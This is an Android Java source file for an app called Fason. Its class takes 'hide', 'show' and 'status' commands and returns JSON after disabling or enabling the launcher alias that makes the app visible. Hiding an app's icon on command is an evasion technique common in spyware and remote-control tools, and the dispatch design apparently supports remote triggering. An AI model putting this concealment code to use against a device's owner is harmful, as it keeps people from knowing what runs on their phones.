package com.fason.app.features.apps;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;

import com.fason.app.core.FasonApp;

import org.json.JSONObject;

// Fason app visibility manager
public final class FasonManager {

    private static final String ALIAS = "com.fason.app.ui.MainActivityAlias";

    private FasonManager() {}

    // Handle command
    public static JSONObject handle(String action) {
        if (action == null) {
            JSONObject r = new JSONObject();
            try { r.put("success", false); r.put("error", "No action"); } catch (Exception ignored) {}
            return r;
        }

        switch (action) {
            case "hide": return hide();
            case "show":
            case "unhide": return show();
            case "status": return status();
            default:
                JSONObject r = new JSONObject();
                try { r.put("success", false); r.put("error", "Unknown action: " + action); } catch (Exception ignored) {}
                return r;
        }
    }

    // Hide from launcher
    public static JSONObject hide() {
        JSONObject result = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();
            PackageManager pm = ctx.getPackageManager();
            ComponentName comp = new ComponentName(ctx, ALIAS);

            pm.setComponentEnabledSetting(comp,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

            result.put("success", true);
            result.put("action", "hide");
            result.put("hidden", true);
            result.put("message", "Hidden from launcher");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    // Show in launcher
    public static JSONObject show() {
        JSONObject result = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();
            PackageManager pm = ctx.getPackageManager();
            ComponentName comp = new ComponentName(ctx, ALIAS);

            pm.setComponentEnabledSetting(comp,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);

            result.put("success", true);
            result.put("action", "show");
            result.put("hidden", false);
            result.put("message", "Visible in launcher");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    // Get status
    public static JSONObject status() {
        JSONObject result = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();
            PackageManager pm = ctx.getPackageManager();
            ComponentName comp = new ComponentName(ctx, ALIAS);
            int state = pm.getComponentEnabledSetting(comp);

            boolean hidden = (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED);

            result.put("success", true);
            result.put("hidden", hidden);
            result.put("status", hidden ? "hidden" : "visible");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    // Legacy method
    public static JSONObject handleCommand(String action) {
        return handle(action);
    }
}
